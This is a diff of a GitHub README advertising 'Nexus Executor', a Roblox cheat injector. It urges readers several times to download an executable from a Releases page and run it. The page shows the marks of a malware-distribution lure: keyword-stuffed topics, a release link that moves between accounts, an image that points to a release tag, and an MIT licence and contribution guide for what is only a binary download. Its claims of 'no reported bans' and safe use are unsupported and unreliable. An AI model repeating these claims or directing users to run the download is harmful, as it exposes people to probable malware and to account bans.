@@ -1,37 +1,105 @@
-# Nexus Roblox Executor - Your Gateway to Powerful Script Execution in Roblox!
+# Nexus Executor for Roblox 🎮
 
-🚀 Welcome to the Nexus Roblox Executor repository, the ultimate tool for executing scripts in Roblox with ease and efficiency. Whether you're a seasoned scripter or just starting out, Nexus Executor offers free and lifetime packages, ensuring that script execution is accessible to everyone. Hosted directly on our website, Nexus Executor boasts a range of features that makes it a preferred choice for many Roblox enthusiasts.
+Welcome to the **Nexus-Roblox** repository! This project provides a powerful tool for executing Luau scripts on Roblox. With Nexus Executor, you can unlock new possibilities in your gaming experience.
 
-## Features 🛠️
+## Table of Contents
 
-🔹 **No Bans:** Nexus Executor has no reported bans, providing a safe environment for script execution.
+- [Overview](#overview)
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Supported Games](#supported-games)
+- [Script Hub](#script-hub)
+- [Contributing](#contributing)
+- [License](#license)
+- [Contact](#contact)
 
-🔹 **Full Luau Support:** Execute all your favorite Luau scripts seamlessly with Nexus Executor.
+## Overview
 
-🔹 **Script Hub:** Access a curated selection of scripts in our small but powerful script hub.
+Nexus Executor offers free and lifetime packages, hosted directly on our website. It supports the execution of all Luau scripts and has no reported bans. Although it features a limited number of games and a small script hub, it remains a reliable choice for Roblox scripting.
 
-🔹 **Limited Games:** Enjoy script execution in a limited number of games with Nexus Executor.
+To get started, you can download the latest version from our [Releases page](https://github.com/LynnandMel/Nexus-Roblox/releases). Make sure to download and execute the appropriate files for your setup.
 
-## Repository Details 📁
+## Features
 
-- **Repository Name:** Nexus-Roblox
-- **Short Description:** Nexus Executor offers free and lifetime packages, and is hosted directly on the website. It supports execution of all Luau scripts and has no reported bans, though it features a limited number of games and a small script hub.
-- **Topics:** #nexus-execute-roblox #nexus-game-scripting #nexus-no-bans #nexus-roblox #nexus-roblox-access #nexus-roblox-scripting #nexus-roblox-scripts #nexus-script-execution #nexus-script-hub #nexus-scripting-tools #nexus-scripts #roblox #roblox-script #roblox-scripts
+- **Free and Lifetime Packages**: Enjoy access to both free and lifetime options.
+- **Robust Script Execution**: Execute all Luau scripts seamlessly.
+- **No Reported Bans**: Use with confidence; our users report no bans.
+- **Web Hosting**: Easily access the executor from our website.
+- **Limited Game Support**: While we have a curated selection, we are constantly working to expand it.
+- **Script Hub**: Access a small but useful collection of scripts.
 
-## Get Started 🚀
+## Installation
 
-Ready to experience the power of Nexus Executor? Download the executor from the link below:
+To install Nexus Executor, follow these steps:
 
-[![Download Nexus Executor](https://github.com/buptyo-100/Nexus-Roblox/releases/tag/Nexus)](https://github.com/buptyo-100/Nexus-Roblox/releases/tag/Nexus)
+1. Visit our [Releases page](https://github.com/LynnandMel/Nexus-Roblox/releases).
+2. Download the latest release suitable for your system.
+3. Extract the files to a desired location on your computer.
+4. Run the executable file to start using Nexus Executor.
 
-📌 **Note:** If the link ends with the file name, make sure to launch the downloaded file to access Nexus Executor.
+Make sure to check the requirements before installation to ensure compatibility.
 
-## Explore Further 🌐
+## Usage
 
-Visit our website [https://github.com/buptyo-100/Nexus-Roblox/releases/tag/Nexus](https://github.com/buptyo-100/Nexus-Roblox/releases/tag/Nexus) to discover more about Nexus Executor and explore additional features and resources.
+Using Nexus Executor is straightforward:
+
+1. Open the Nexus Executor application.
+2. Copy the Luau script you wish to execute.
+3. Paste the script into the provided input field.
+4. Click the "Execute" button to run the script in your Roblox game.
+
+Remember, you can always refer to the script hub for additional scripts that may enhance your gameplay.
+
+## Supported Games
+
+Currently, Nexus Executor supports a select number of Roblox games. We are working on expanding this list. Check back regularly for updates. If you have a specific game in mind, feel free to reach out and suggest it.
+
+## Script Hub
+
+The script hub is a feature that allows you to access various scripts for different functionalities. While it is currently small, we aim to grow this collection over time. If you have scripts you would like to contribute, please reach out.
+
+## Contributing
+
+We welcome contributions from the community! If you would like to help improve Nexus Executor, follow these steps:
+
+1. Fork the repository.
+2. Create a new branch for your feature or bug fix.
+3. Make your changes and commit them.
+4. Push your changes to your forked repository.
+5. Submit a pull request for review.
+
+Your contributions help make Nexus Executor better for everyone!
+
+## License
+
+This project is licensed under the MIT License. Feel free to use, modify, and distribute it as per the license terms.
+
+## Contact
+
+For any questions or support, please contact us through the GitHub issues page or reach out via our official website.
+
+Thank you for using Nexus Executor! We hope it enhances your Roblox experience. For the latest updates and releases, don’t forget to check our [Releases page](https://github.com/LynnandMel/Nexus-Roblox/releases) again.
 
 ---
 
-With Nexus Roblox Executor, scripting in Roblox becomes a seamless and enjoyable experience. Join the community of scripters leveraging the power of Nexus Executor today! If you encounter any issues with the download link, feel free to check the "Releases" section for alternative options. Happy scripting! 🎮💻
+## Topics
 
-![Roblox Logo](https://github.com/buptyo-100/Nexus-Roblox/releases/tag/Nexus)
+- injector-roblox-free
+- nexus-game-scripting
+- nexus-roblox-access
+- nexus-roblox-scripting
+- nexus-script-execution
+- nexus-script-hub
+- nexus-scripts
+- nexus-lifetime-access
+- nexus-web-hosted
+- roblox-free-injector
+- roblox-injectors-free
+- roblox-lua-executors
+- roblox-script
+- roblox-scripts
+
+---
+
+Thank you for visiting the **Nexus-Roblox** repository! We appreciate your support and interest in our project. Happy scripting!
